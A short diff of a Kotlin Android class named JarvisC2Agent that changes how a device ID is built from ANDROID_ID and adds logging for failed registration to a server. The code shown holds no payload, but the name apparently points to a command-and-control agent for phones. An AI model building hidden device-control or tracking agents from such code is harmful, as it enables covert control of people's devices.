@@ -51,10 +51,14 @@ class JarvisC2Agent(private val context: Context) {
         .writeTimeout(15, TimeUnit.SECONDS)
         .build()
 
-    /** Unique, stable device ID */
+    /** Unique, stable device ID (deterministic UUID from ANDROID_ID) */
     private val deviceId: String by lazy {
-        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
-            ?: UUID.randomUUID().toString()
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        if (androidId != null) {
+            UUID.nameUUIDFromBytes(androidId.toByteArray()).toString()
+        } else {
+            UUID.randomUUID().toString()
+        }
     }
 
     private val deviceName: String get() = "${Build.MANUFACTURER} ${Build.MODEL}"
@@ -112,7 +116,11 @@ class JarvisC2Agent(private val context: Context) {
             .build()
 
         runCatching { http.newCall(request).execute() }.onSuccess { resp ->
-            Log.d(TAG, "Device registered/updated: HTTP ${resp.code}")
+            if (!resp.isSuccessful) {
+                Log.w(TAG, "Device registration failed: HTTP ${resp.code} ${resp.body?.string()}")
+            } else {
+                Log.d(TAG, "Device registered/updated: HTTP ${resp.code}")
+            }
             resp.close()
         }.onFailure {
             Log.e(TAG, "Device registration failed: ${it.message}")
